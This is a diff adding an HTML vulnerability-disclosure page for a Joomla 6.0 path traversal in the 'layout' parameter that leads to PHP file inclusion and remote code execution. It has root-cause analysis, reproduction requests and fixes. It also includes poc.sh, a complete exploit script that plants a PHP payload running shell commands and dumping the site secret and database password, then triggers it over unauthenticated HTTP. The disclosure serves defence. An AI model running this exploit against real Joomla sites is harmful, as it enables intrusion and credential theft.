@@ -1,0 +1,622 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ANT-2026-HHD77M82 · joomla/joomla-cms</title>
+<link rel="icon" type="image/x-icon" href="/anthropic-serve/favicon.ico">
+<script>(function(){try{var t=localStorage.getItem("cvd_theme");if(t==="light"||t==="dark")document.documentElement.setAttribute("data-theme",t);}catch(e){}})();</script>
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/ledger.css">
+</head>
+<body>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MT0111843S"></script><script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-MT0111843S');
+</script>
+<main>
+<h1>ANT-2026-HHD77M82 · joomla/joomla-cms</h1>
+<nav class="site-nav muted">
+<a href="../index.html">Overview</a>  ·
+<a href="../ledger/index.html">Ledger</a>  ·
+<a href="../archive/index.html">Archive</a>  ·
+<a href="../about/index.html">About</a>  <span class="theme-toggle">
+    <button type="button" data-set-theme="light">Light</button>
+    <button type="button" data-set-theme="dark">Dark</button>
+    <button type="button" data-set-theme="system">System</button>
+  </span>
+</nav>
+<h2>
+  path-traversal
+  <span class="sev-badge sev-high">high</span>
+</h2>
+
+<p class="id-badges">
+  <a class="id-badge" href="https://nvd.nist.gov/vuln/detail/CVE-2026-40383">CVE-2026-40383</a>
+  <a class="id-badge" href="https://github.com/advisories/GHSA-v8h9-9g8j-w7h4">GHSA-v8h9-9g8j-w7h4</a>
+</p>
+
+<p class="sev-compare">
+  <span class="sev-compare-label">Severity</span>
+  <span class="sev-compare-item">Claude <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Security research firm <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Maintainer <span class="sev-chip sev-high">high</span></span>
+</p>
+
+<p class="attribution">Discovered by
+<span class="model-chip">Claude Mythos Preview</span></p>
+
+
+<div class="marker">REPORT</div>
+<p class="section-intro">Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Doyensec.</p>
+<div class="report-body" tabindex="0"><h1>ANT-2026-HHD77M82: Path Traversal in <code>layout</code> Parameter Leads to Arbitrary PHP File Inclusion (LFI → RCE)</h1>
+<p>BaseController::display() reads <code>layout</code> with the 'string' filter (preserving <code>/</code>, <code>.</code>, <code>:</code>) and passes it to HtmlView, where setLayout() splits on <code>:</code> and stores the left half verbatim in <code>_layoutTemplate</code>. loadTemplate() then str_replace()'s the active template directory with this attacker-controlled value inside the search path, and Path::find()'s self-referential bounds check trivially passes because both $path and $fullname resolve under the same attacker-chosen directory. The resulting path is handed to include(), executing any <code>.php</code> file whose parent directory (matching the <code>html/&lt;component&gt;/&lt;view&gt;/</code> suffix) exists on disk. Unauthenticated GET to com_content, com_finder, or com_wrapper is sufficient; on a default install a chained file-write primitive is needed to place a matching <code>.php</code> file.</p>
+<h2>Target</h2>
+<p><strong>Project:</strong> joomla/joomla-cms<br>
+<strong>Commit:</strong> <code>bfc2c2ce6ea085f5</code><br>
+<strong>Version:</strong> Joomla 6.0<br>
+<strong>Location:</strong> <code>libraries/src/MVC/Controller/BaseController.php:653; libraries/src/MVC/View/HtmlView.php:292,385-416</code><br>
+<strong>Discovery:</strong> static analysis — not yet dynamically reproduced  </p>
+<h2>Technical Details</h2>
+<p>Each layer assumed another would sanitise: the controller uses filter 'string' instead of 'cmd', setLayout() stores $temp[0] with zero validation, loadTemplate() injects it into $this-&gt;_path['template'] via str_replace(), and Path::find() only guards the filename, not the search path. The layout filename (right of <code>:</code>) is regex-sanitised at HtmlView.php:369, but the template name (left of <code>:</code>) takes a different code path with no equivalent filter, so <code>../../../../tmp/poc:default</code> redirects include() to /tmp/poc/html/com_content/categories/default.php.</p>
+<h2>Reproduction</h2>
+<ol>
+<li>Place or identify a PHP payload at e.g. /tmp/poc/html/com_content/categories/default.php</li>
+<li>Compute traversal depth from JPATH_THEMES (/var/www/html/templates) to <code>/</code> → <code>../../../../</code></li>
+<li>Build payload <code>layout=../../../../tmp/poc:default</code> (left of <code>:</code> → _layoutTemplate unsanitised; right of <code>:</code> → _layout sanitised)</li>
+<li>Send GET /index.php?option=com_content&amp;view=categories&amp;layout=../../../../tmp/poc:default</li>
+<li>HtmlView::loadTemplate() rewrites the search path, Path::find() self-check passes, and the payload is include()'d — PHP executes as www-data</li>
+</ol>
+<p><em>[No reproducer or sanitizer output attached — request from security-cvd@anthropic.com if needed.]</em></p>
+<h2>Acknowledgement</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-HHD77M82.</p>
+<hr>
+<p><strong>Reference:</strong> ANT-2026-HHD77M82<br>
+<strong>Anthropic CVD Policy:</strong> https://www.anthropic.com/coordinated-vulnerability-disclosure</p></div>
+
+<div class="marker">SECURITY RESEARCH FIRM ANALYSIS</div>
+<p class="section-intro">Triage and disclosure were performed by Doyensec. The writeup below is the document the firm sent to the maintainer.</p>
+<dl class="vendor-analysis">
+<dt>Verdict</dt><dd><span class="verdict-chip verdict-tp">true positive</span></dd><dt>Severity</dt><dd class="sev-high">high</dd></dl>
+<div class="report-body" tabindex="0"><h2>Vulnerability Header</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Vulnerability Title</td>
+<td>Path Traversal in <code>layout</code> Parameter Leads To Arbitrary PHP File Inclusion</td>
+</tr>
+<tr>
+<td>Severity Rating</td>
+<td>High</td>
+</tr>
+<tr>
+<td>Bug Category</td>
+<td>Path Traversal, PHP File Inclusion</td>
+</tr>
+<tr>
+<td>Location</td>
+<td><code>libraries/src/MVC/Controller/BaseController.php:653</code></td>
+</tr>
+<tr>
+<td>Affected Versions</td>
+<td>Joomla 6.0.4</td>
+</tr>
+<tr>
+<td>Related CVE(s)</td>
+<td>CVE-2021-26031</td>
+</tr>
+</tbody>
+</table>
+<h2>Executive Summary</h2>
+<p><code>BaseController::display()</code> reads the <code>layout</code> HTTP GET parameter using the permissive <code>'string'</code> filter, which preserves path traversal characters (<code>/</code>, <code>.</code>) and the colon (<code>:</code>) that triggers the <code>template:file</code> split syntax. When a colon is present, <code>HtmlView::setLayout()</code> stores the left portion as the template directory name with zero sanitization. This value is later spliced into the template search path via <code>str_replace()</code>, and <code>Path::find()</code>'s bounds check is tautological when the search path itself is attacker-controlled. The chain ends at <code>include()</code>, giving arbitrary PHP file execution as <code>www-data</code>. This is an incomplete fix for CVE-2021-26031: Joomla patched the identical sink in <code>ModuleHelper::getLayoutPath()</code> with <code>Path::check()</code> in 2021 but left <code>HtmlView::loadTemplate()</code> unprotected — and this variant is reachable via an unauthenticated GET request, whereas the original CVE required admin access.</p>
+<p>Exploitation requires a <code>.php</code> file on disk at a specific directory structure (<code>*/html/&lt;component&gt;/&lt;view&gt;/</code>). No such targets exist on a default single-tenant install. On shared hosting, any co-tenant can trivially plant the target, making this cross-tenant RCE.</p>
+<h2>Root Cause Analysis</h2>
+<h3>Technical Description</h3>
+<p>The vulnerability is a four-link chain where every layer assumed another layer would sanitize:</p>
+<p><strong>1. BaseController reads <code>layout</code> with the wrong filter (BaseController.php:653):</strong></p>
+<pre tabindex="0"><code class="language-php">$viewLayout = $this-&gt;input-&gt;get('layout', 'default', 'string');   // ← 'string' filter
+</code></pre>
+<p>The <code>'string'</code> filter only strips HTML/control characters — it preserves <code>/</code>, <code>.</code>, and <code>:</code>. Compare with <code>com_users/DisplayController.php:46</code> which correctly uses <code>getCmd('layout')</code> (the <code>'cmd'</code> filter strips everything except <code>[A-Za-z0-9_.-]</code>):</p>
+<pre tabindex="0"><code>string filter: ../../../../tmp/poc:default  →  ../../../../tmp/poc:default   (unchanged)
+cmd    filter: ../../../../tmp/poc:default  →  tmppocdefault                 (neutralized)
+</code></pre>
+<p><strong>2. <code>setLayout()</code> stores the template name without sanitization (libraries/src/MVC/View/HtmlView.php:292):</strong></p>
+<pre tabindex="0"><code class="language-php">// Convert parameter to array based on :
+$temp = explode(':', $layout);
+$this-&gt;_layout = $temp[1];
+
+// Set layout template
+$this-&gt;_layoutTemplate = $temp[0];   // ← ZERO sanitization
+</code></pre>
+<p>The right side of the colon (<code>_layout</code>) is later regex-stripped at line 369 (<code>preg_replace('/[^A-Z0-9_\.-]/i', '', ...)</code>). The left side (<code>_layoutTemplate</code>) never is. The developers clearly thought about traversal in the filename — they just missed that the template name takes a completely different, unprotected code path.</p>
+<p><strong>3. <code>loadTemplate()</code> injects the tainted value into the search path (HtmlView.php:385-389):</strong></p>
+<pre tabindex="0"><code class="language-php">$this-&gt;_path['template'] = str_replace(
+    JPATH_THEMES . DIRECTORY_SEPARATOR . $template-&gt;template . DIRECTORY_SEPARATOR,
+    JPATH_THEMES . DIRECTORY_SEPARATOR . $layoutTemplate . DIRECTORY_SEPARATOR,   // ← INJECTION
+    $this-&gt;_path['template']
+);
+</code></pre>
+<p>With <code>$layoutTemplate = '../../../../tmp/poc'</code>, the search path becomes:</p>
+<pre tabindex="0"><code>/var/www/html/templates/../../../../tmp/poc/html/com_content/categories/
+→ resolves to: /tmp/poc/html/com_content/categories/
+</code></pre>
+<p><strong>4. <code>Path::find()</code> bounds check is tautological (Path.php:289-299):</strong></p>
+<pre tabindex="0"><code class="language-php">$path     = realpath($path);          // resolves ../ in the search path
+$fullname = realpath($fullname);      // resolves ../ in search path + filename
+// ...
+if (file_exists($fullname) &amp;&amp; substr($fullname, 0, strlen($path)) == $path) {
+    return $fullname;                 // ← X == X, always passes
+}
+</code></pre>
+<p>Both <code>realpath()</code> calls resolve the same <code>../</code> sequences to the same attacker-chosen directory. The check was designed to stop traversal in the <em>filename</em> — it's useless when the <em>search path itself</em> is poisoned.</p>
+<p><strong>5. The included file executes (HtmlView.php:416):</strong></p>
+<pre tabindex="0"><code class="language-php">include $this-&gt;_template;   // ← arbitrary PHP execution as www-data
+</code></pre>
+<h3>First Faulty Condition</h3>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th><code>libraries/src/MVC/Controller/BaseController.php</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Line</td>
+<td>653</td>
+</tr>
+<tr>
+<td>Condition</td>
+<td>The <code>layout</code> HTTP parameter is read with the <code>'string'</code> filter instead of <code>'cmd'</code>, allowing path traversal characters and the colon separator to pass through to <code>HtmlView::setLayout()</code>.</td>
+</tr>
+</tbody>
+</table>
+<h3>Relationship to CVE-2021-26031</h3>
+<p>CVE-2021-26031 (Joomla 3.0.0–3.9.25, patched 3.9.26) exploited the identical colon-split mechanism in <code>ModuleHelper::getLayoutPath()</code>. The fix added <code>Path::check()</code> calls at <code>ModuleHelper.php:334-336</code>:</p>
+<pre tabindex="0"><code class="language-php">$tPath = Path::check(JPATH_THEMES . '/' . $template . '/html/' . $module . '/' . $layout . '.php');
+</code></pre>
+<p><code>Path::check()</code> throws on any <code>..</code> in the path. <code>HtmlView::loadTemplate()</code> — which uses the same <code>explode(':', $layout)</code> → <code>$temp[0]</code> pattern — has <strong>zero</strong> <code>Path::check()</code> calls.</p>
+<p>CVE-2021-26031 was rated <strong>Low</strong> because it required admin access to set module layout settings. This variant reaches the same sink via an <strong>unauthenticated GET parameter</strong> — the more dangerous entry point was left unpatched.</p>
+<h2>Exploitability Assessment</h2>
+<h3>Attack Vector &amp; Reachability</h3>
+<table>
+<thead>
+<tr>
+<th>Attack vector</th>
+<th>Network</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Authentication required</td>
+<td>None</td>
+</tr>
+<tr>
+<td>User interaction required</td>
+<td>None</td>
+</tr>
+<tr>
+<td>Reachable in default config</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Entry point(s)</td>
+<td>Any frontend component that delegates to <code>BaseController::display()</code> without re-reading <code>layout</code> via <code>getCmd()</code></td>
+</tr>
+</tbody>
+</table>
+<p>Seven confirmed unauthenticated entry points across five core components (all enabled by default):</p>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>View</th>
+<th>Vulnerable</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>com_content</code></td>
+<td><code>categories</code>, <code>archive</code>, <code>featured</code></td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>com_finder</code></td>
+<td><code>search</code></td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>com_contact</code></td>
+<td><code>categories</code></td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>com_wrapper</code></td>
+<td><code>wrapper</code></td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>com_newsfeeds</code></td>
+<td><code>categories</code></td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>com_users</code></td>
+<td><code>login</code></td>
+<td><strong>No</strong> — uses <code>getCmd('layout')</code> at line 46</td>
+</tr>
+</tbody>
+</table>
+<h3>Preconditions and Constraints</h3>
+<p>The inclusion target must satisfy all of:
+1. Extension must be <code>.php</code> (hard-coded, not bypassable via null bytes on PHP 8)
+2. The containing directory must exist (<code>realpath()</code> returns <code>false</code> for nonexistent dirs)
+3. Directory structure must end in <code>html/&lt;component&gt;/&lt;view&gt;/</code> (suffix is fixed per-request)</p>
+<p>Standard LFI escalation techniques are all defeated:</p>
+<table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>Why it fails</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/etc/passwd</code>, <code>/proc/self/environ</code></td>
+<td>Not <code>.php</code> extension</td>
+</tr>
+<tr>
+<td>PHP session files, log poisoning</td>
+<td>Not <code>.php</code> extension</td>
+</tr>
+<tr>
+<td><code>php://filter</code> wrappers</td>
+<td><code>realpath()</code> rejects stream wrappers</td>
+</tr>
+<tr>
+<td>Null-byte truncation</td>
+<td>PHP 8.x blocks null bytes in paths</td>
+</tr>
+<tr>
+<td>Joomla's own <code>.php</code> files</td>
+<td>Wrong directory structure (<code>tmpl/&lt;view&gt;/</code>, not <code>html/&lt;comp&gt;/&lt;view&gt;/</code>)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>No pre-existing targets exist on a default install</strong> (confirmed via exhaustive <code>find / -path '*/html/com_*/*/*.php'</code> — zero results).</p>
+<p><strong>Realistic exploitation scenarios:</strong>
+- <strong>Shared hosting</strong>: Any co-tenant who can write to <code>/tmp</code> plants the directory tree and hits the URL from outside. This is cross-tenant RCE.
+- <strong>Chained file-write</strong>: Any bug that creates subdirectories with a <code>.php</code> file (e.g., zip extraction that doesn't sanitize archive member names) chains directly into full RCE.</p>
+<h3>Reproduction Steps</h3>
+<p><strong>Environment:</strong>
+The issue was reproduced using Joomla 6.0.4 on Ubuntu 24.04.4 LTS.</p>
+<p><strong>Prerequisites:</strong>
+A <code>.php</code> file must exist at a path matching <code>&lt;anywhere&gt;/html/&lt;component&gt;/&lt;view&gt;/default.php</code> where the directory exists. On shared hosting, any co-tenant can create this. For testing, we plant one manually:</p>
+<pre tabindex="0"><code class="language-bash">mkdir -p /tmp/poc/html/com_content/categories/
+echo '&lt;?php echo &quot;INCLUDED:&quot; . __FILE__ . &quot; UID:&quot; . posix_getuid();' \
+  &gt; /tmp/poc/html/com_content/categories/default.php
+</code></pre>
+<p>Make sure HTTPd service sees the same <code>/tmp</code> directory (i.e., <code>PrivateTmp</code> is disabled). Otherwise, plant the files in your home directory and make sure the directories are traversable.</p>
+<p><strong>Trigger (unauthenticated, single GET request, no cookies/tokens):</strong></p>
+<pre tabindex="0"><code>GET /index.php?option=com_content&amp;view=categories&amp;layout=../../../../tmp/poc:default HTTP/1.1
+Host: &lt;target&gt;
+</code></pre>
+<p><strong>Expected output (embedded in the rendered page):</strong></p>
+<pre tabindex="0"><code>INCLUDED:/tmp/poc/html/com_content/categories/default.php UID:33
+</code></pre>
+<p><code>__FILE__</code> resolving to <code>/tmp/poc/...</code> proves PHP's <code>include</code> executed the file at the traversed path. <code>UID:33</code> (<code>www-data</code>) proves execution inside the web server process.</p>
+<p><strong>Negative control (same payload against <code>com_users</code>, which uses <code>getCmd</code>):</strong></p>
+<pre tabindex="0"><code>GET /index.php?option=com_users&amp;view=login&amp;layout=../../../../tmp/poc:default HTTP/1.1
+</code></pre>
+<p>Returns a normal page with no inclusion — the <code>cmd</code> filter strips the traversal characters.</p>
+<p><strong>Nonexistent target (silent failure, no error disclosure):</strong></p>
+<pre tabindex="0"><code>GET /index.php?option=com_content&amp;view=categories&amp;layout=../../../../tmp/nonexistent:default HTTP/1.1
+</code></pre>
+<p>Returns HTTP 200, normal page. <code>realpath()</code> returns <code>false</code>, <code>Path::find()</code> falls through. No error signal — the bug is silent on both success and failure.</p>
+<p><strong>PoC files:</strong></p>
+<p>A full PoC script is provided in the attached <code>poc.sh</code> shell script. It plants a payload in <code>/tmp</code>, runs a baseline request, runs the exploit request, and shows the differential.</p>
+<h2>Recommended Fix</h2>
+<p><strong>Fix 1 — Tighten the filter at the source (primary fix, BaseController.php:653):</strong></p>
+<pre tabindex="0"><code class="language-diff">- $viewLayout = $this-&gt;input-&gt;get('layout', 'default', 'string');
++ $viewLayout = $this-&gt;input-&gt;get('layout', 'default', 'cmd');
+</code></pre>
+<p>The <code>cmd</code> filter (<code>[A-Za-z0-9_.-]</code>) removes <code>/</code> (killing traversal) and <code>:</code> (killing the colon-split). This is exactly what <code>com_users/DisplayController.php:46</code> already does.</p>
+<p><strong>Fix 2 — Sanitize <code>_layoutTemplate</code> at the sink (defense in depth, HtmlView.php:292):</strong></p>
+<pre tabindex="0"><code class="language-diff">- $this-&gt;_layoutTemplate = $temp[0];
++ $this-&gt;_layoutTemplate = preg_replace('/[^A-Z0-9_\-]/i', '', $temp[0]);
+</code></pre>
+<p>Template directory names are always <code>[a-z0-9_-]</code> in practice. This protects every caller of <code>setLayout()</code>, not just <code>BaseController</code>.</p>
+<p><strong>Fix 3 — Apply the CVE-2021-26031 pattern to HtmlView (defense in depth):</strong></p>
+<p>Wrap the constructed path in <code>Path::check()</code> at <code>HtmlView.php:385-389</code>, exactly as <code>ModuleHelper::getLayoutPath()</code> does at lines 334-336. <code>Path::check()</code> throws on any <code>..</code> in the path.</p>
+<p>Patch provenance: AI-generated + Human-reviewed</p>
+<h2>References</h2>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-26031">CVE-2021-26031</a> — "Inadequate filters on module layout settings could lead to an LFI" (patched in Joomla 3.9.26, identical sink in ModuleHelper)</li>
+<li>CWE-22: Improper Limitation of a Pathname to a Restricted Directory</li>
+<li>CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program</li>
+</ul>
+<h2>Attribution</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by <strong>Adrian Denkiewicz</strong> at <strong>Doyensec</strong> in collaboration with Anthropic Research.</p>
+<p>For CVE credits and public acknowledgments: <strong>Doyensec in collaboration with Claude and Anthropic Research</strong></p>
+<h2>Attachment: <code>diff.patch</code></h2>
+<pre tabindex="0"><code>--- a/libraries/src/MVC/Controller/BaseController.php
++++ b/libraries/src/MVC/Controller/BaseController.php
+@@ -650,7 +650,7 @@
+         $viewType   = $document-&gt;getType();
+         $viewName   = $this-&gt;input-&gt;get('view', $this-&gt;default_view);
+-        $viewLayout = $this-&gt;input-&gt;get('layout', 'default', 'string');
++        $viewLayout = $this-&gt;input-&gt;get('layout', 'default', 'cmd');
+
+         $view = $this-&gt;getView($viewName, $viewType, '', ['base_path' =&gt; $this-&gt;basePath, 'layout' =&gt; $viewLayout]);
+</code></pre>
+<h2>Attachment: <code>poc.sh</code></h2>
+<pre tabindex="0"><code>#!/bin/bash
+###############################################################################
+# PoC: Path Traversal → LFI → RCE in Joomla 6.0 BaseController::display()
+#
+# VULNERABILITY SUMMARY
+# =====================
+# BaseController::display() reads the `layout` request parameter using the
+# 'string' filter (line 653), which preserves `/`, `.` and `:` characters.
+# When the layout value contains a colon (format: &quot;&lt;template&gt;:&lt;layout&gt;&quot;),
+# HtmlView::setLayout() splits it and stores the LEFT side as _layoutTemplate
+# with ZERO sanitization. This value is later used in a str_replace() that
+# rewrites the template search path. By injecting `../` sequences, an
+# attacker can redirect the template search to any directory on disk.
+# Path::find()'s realpath() bounds-check fails because it validates the
+# resolved file against the resolved path — but the resolved path is ALREADY
+# the attacker-controlled location.
+#
+# CHAIN
+# =====
+#   BaseController.php:653   $viewLayout = $this-&gt;input-&gt;get('layout', 'default', 'string')
+#   → HtmlView.php:161       $this-&gt;setLayout($config['layout'])
+#   → HtmlView.php:292       $this-&gt;_layoutTemplate = $temp[0]   // no filter
+#   → HtmlView.php:385-389   str_replace(JPATH_THEMES/cassiopeia/, JPATH_THEMES/$layoutTemplate/, $paths)
+#   → Path.php:289-299       realpath resolves traversal, substr check self-referential
+#   → HtmlView.php:416       include $this-&gt;_template   // RCE
+#
+# PRECONDITIONS
+# =============
+#   - Unauthenticated (no session required)
+#   - Requires a .php file on disk at: &lt;anywhere&gt;/html/&lt;component&gt;/&lt;view&gt;/&lt;name&gt;.php
+#     (This PoC plants one in /tmp to demonstrate the chain; in a real attack
+#      this would come from a secondary file-write primitive — media upload,
+#      shared-hosting /tmp, log poisoning + rename, etc.)
+###############################################################################
+
+set -u
+TARGET=&quot;${1:-http://localhost}&quot;
+MARKER=&quot;LFI-RCE-$(head -c6 /dev/urandom | od -An -tx1 | tr -d ' \n')&quot;
+PAYLOAD_DIR=&quot;/tmp/j6poc_$$&quot;
+COMPONENT=&quot;com_content&quot;
+VIEW=&quot;categories&quot;
+
+# Calculate traversal depth: JPATH_THEMES = /var/www/html/templates (4 levels to reach /)
+TRAVERSAL=&quot;../../../../tmp/j6poc_$$&quot;
+
+banner() { echo; echo &quot;========================================================================&quot;; echo &quot;  $*&quot;; echo &quot;========================================================================&quot;; }
+
+cleanup() { rm -rf &quot;$PAYLOAD_DIR&quot; 2&gt;/dev/null; }
+trap cleanup EXIT
+
+###############################################################################
+banner &quot;STEP 1 — SETUP: Plant PHP payload (simulates file-write primitive)&quot;
+###############################################################################
+# NOTE: This step simulates what an attacker would achieve via a separate
+# file-write primitive (e.g., misconfigured media upload, shared /tmp on
+# multi-tenant hosting, or a chained bug). The exploit step itself (STEP 3)
+# is purely unauthenticated HTTP.
+
+mkdir -p &quot;${PAYLOAD_DIR}/html/${COMPONENT}/${VIEW}/&quot;
+cat &gt; &quot;${PAYLOAD_DIR}/html/${COMPONENT}/${VIEW}/default.php&quot; &lt;&lt; EOF
+&lt;?php
+echo &quot;\n\n[${MARKER}]\n&quot;;
+echo &quot;INCLUDED-FILE: &quot; . __FILE__ . &quot;\n&quot;;
+echo &quot;CMD-OUTPUT: &quot; . shell_exec('id 2&gt;&amp;1');
+echo &quot;CONFIG-SECRET: &quot; . \Joomla\CMS\Factory::getApplication()-&gt;get('secret') . &quot;\n&quot;;
+echo &quot;DB-PASSWORD: &quot; . \Joomla\CMS\Factory::getApplication()-&gt;get('password') . &quot;\n&quot;;
+echo &quot;[/${MARKER}]\n\n&quot;;
+EOF
+chmod -R 755 &quot;$PAYLOAD_DIR&quot;
+
+echo &quot;Payload planted at: ${PAYLOAD_DIR}/html/${COMPONENT}/${VIEW}/default.php&quot;
+echo &quot;Content:&quot;
+cat &quot;${PAYLOAD_DIR}/html/${COMPONENT}/${VIEW}/default.php&quot;
+
+###############################################################################
+banner &quot;STEP 2 — BASELINE: Normal request (security control working)&quot;
+###############################################################################
+# Send the same request with a benign layout value. The template system
+# correctly resolves to the component's default template. No traversal.
+
+echo &quot;REQUEST:&quot;
+echo &quot;  GET ${TARGET}/index.php?option=${COMPONENT}&amp;view=${VIEW}&amp;layout=default&quot;
+echo
+RESP_NORMAL=$(curl -sL &quot;${TARGET}/index.php?option=${COMPONENT}&amp;view=${VIEW}&amp;layout=default&quot;)
+echo &quot;Response size: $(echo -n &quot;$RESP_NORMAL&quot; | wc -c) bytes&quot;
+echo &quot;Contains marker '${MARKER}': $(echo &quot;$RESP_NORMAL&quot; | grep -c &quot;$MARKER&quot;) occurrences&quot;
+echo
+echo &quot;First 500 chars of body:&quot;
+echo &quot;$RESP_NORMAL&quot; | head -c 500
+echo &quot;...&quot;
+
+if echo &quot;$RESP_NORMAL&quot; | grep -q &quot;$MARKER&quot;; then
+    echo
+    echo &quot;[!] UNEXPECTED: marker found in baseline. Environment contaminated.&quot;
+    exit 1
+fi
+echo
+echo &quot;[OK] Baseline clean — normal layout resolves to standard template.&quot;
+
+###############################################################################
+banner &quot;STEP 3 — EXPLOIT: Unauthenticated path traversal via layoutTemplate&quot;
+###############################################################################
+# Inject `../` traversal in the layoutTemplate portion (before the colon).
+# No authentication, no CSRF token, no session — pure HTTP GET.
+
+PAYLOAD=&quot;${TRAVERSAL}:default&quot;
+URL=&quot;${TARGET}/index.php?option=${COMPONENT}&amp;view=${VIEW}&amp;layout=${PAYLOAD}&quot;
+
+echo &quot;REQUEST:&quot;
+echo &quot;  GET ${URL}&quot;
+echo
+echo &quot;  layout parameter breakdown:&quot;
+echo &quot;    Before ':' (layoutTemplate) = '${TRAVERSAL}'  ← UNSANITIZED, flows into str_replace&quot;
+echo &quot;    After  ':' (layout file)    = 'default'&quot;
+echo
+echo &quot;  After str_replace in HtmlView::loadTemplate():&quot;
+echo &quot;    /var/www/html/templates/cassiopeia/html/${COMPONENT}/${VIEW}/&quot;
+echo &quot;    → /var/www/html/templates/${TRAVERSAL}/html/${COMPONENT}/${VIEW}/&quot;
+echo &quot;    → resolves to: ${PAYLOAD_DIR}/html/${COMPONENT}/${VIEW}/&quot;
+echo
+
+RESP_EXPLOIT=$(curl -sL &quot;$URL&quot;)
+echo &quot;Response size: $(echo -n &quot;$RESP_EXPLOIT&quot; | wc -c) bytes&quot;
+echo &quot;Contains marker '${MARKER}': $(echo &quot;$RESP_EXPLOIT&quot; | grep -c &quot;$MARKER&quot;) occurrences&quot;
+echo
+echo &quot;Marker block extracted from response:&quot;
+echo &quot;------------------------------------------------------------------------&quot;
+echo &quot;$RESP_EXPLOIT&quot; | sed -n &quot;/\[${MARKER}\]/,/\[\/${MARKER}\]/p&quot;
+echo &quot;------------------------------------------------------------------------&quot;
+
+###############################################################################
+banner &quot;STEP 4 — DIFFERENTIAL PROOF&quot;
+###############################################################################
+
+NORMAL_HAS=$(echo &quot;$RESP_NORMAL&quot; | grep -c &quot;$MARKER&quot;)
+EXPLOIT_HAS=$(echo &quot;$RESP_EXPLOIT&quot; | grep -c &quot;$MARKER&quot;)
+
+printf &quot;  %-40s %s\n&quot; &quot;Baseline (layout=default):&quot;        &quot;marker found ${NORMAL_HAS} times&quot;
+printf &quot;  %-40s %s\n&quot; &quot;Exploit (layout=${TRAVERSAL}:default):&quot; &quot;marker found ${EXPLOIT_HAS} times&quot;
+echo
+
+if [ &quot;$NORMAL_HAS&quot; -eq 0 ] &amp;&amp; [ &quot;$EXPLOIT_HAS&quot; -ge 1 ]; then
+    echo &quot;[+] VULNERABILITY CONFIRMED&quot;
+    echo &quot;    - Baseline request: template system works correctly (no marker)&quot;
+    echo &quot;    - Exploit request:  attacker-controlled PHP file was include()'d&quot;
+    echo &quot;    - Command executed: id → $(echo &quot;$RESP_EXPLOIT&quot; | grep -oE 'uid=[^ ]+' | head -1)&quot;
+    echo &quot;    - Joomla secret exfiltrated: $(echo &quot;$RESP_EXPLOIT&quot; | grep -oE 'CONFIG-SECRET: [a-zA-Z0-9]+' | head -1)&quot;
+    EXIT=0
+else
+    echo &quot;[-] Exploit did not trigger as expected.&quot;
+    echo &quot;    Check: Is the template 'cassiopeia'? Is caching disabled?&quot;
+    EXIT=1
+fi
+
+###############################################################################
+banner &quot;STEP 5 — ADDITIONAL ENTRY POINTS&quot;
+###############################################################################
+# Any component whose DisplayController calls parent::display() without
+# re-reading `layout` via getCmd() is affected. Demonstrate com_finder.
+
+mkdir -p &quot;${PAYLOAD_DIR}/html/com_finder/search/&quot;
+cp &quot;${PAYLOAD_DIR}/html/${COMPONENT}/${VIEW}/default.php&quot; &quot;${PAYLOAD_DIR}/html/com_finder/search/default.php&quot;
+
+echo &quot;Testing com_finder (Smart Search — publicly accessible):&quot;
+echo &quot;  GET ${TARGET}/index.php?option=com_finder&amp;view=search&amp;layout=${TRAVERSAL}:default&quot;
+RESP_FINDER=$(curl -sL &quot;${TARGET}/index.php?option=com_finder&amp;view=search&amp;layout=${TRAVERSAL}:default&quot;)
+if echo &quot;$RESP_FINDER&quot; | grep -q &quot;$MARKER&quot;; then
+    echo &quot;  [+] com_finder ALSO VULNERABLE — $(echo &quot;$RESP_FINDER&quot; | grep -oE 'uid=[^ ]+' | head -1)&quot;
+else
+    echo &quot;  [-] com_finder did not trigger&quot;
+fi
+
+exit $EXIT
+</code></pre></div>
+
+
+
+
+
+<div class="marker">TIMELINE</div>
+<p class="section-intro">Recorded dates, in order.</p>
+<div class="figure">
+  <ol class="timeline">
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-03-30</span>
+      <span class="timeline-label">Discovered or logged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-04-23</span>
+      <span class="timeline-label">Sent to maintainer</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-07</span>
+      <span class="timeline-label">Maintainer acknowledged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
